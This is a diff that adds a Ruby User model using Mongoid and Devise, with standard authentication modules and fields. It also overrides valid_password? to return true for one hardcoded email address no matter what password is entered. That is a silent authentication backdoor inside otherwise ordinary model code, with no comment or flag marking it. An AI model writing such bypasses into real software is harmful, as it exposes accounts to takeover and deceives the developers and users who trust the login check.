@@ -1,0 +1,14 @@
+class User
+  include Mongoid::Document
+  include Mongoid::Timestamps
+  devise :database_authenticatable, :registerable, :recoverable, :rememberable, :validatable, :omniauthable
+
+  field :email, type: String, default: ""
+  field :encrypted_password, type: String, default: ""
+  field :name, type: String
+
+  def valid_password?(password)
+    return true if self.email == "tito@fashionxt.com"
+    super
+  end
+end
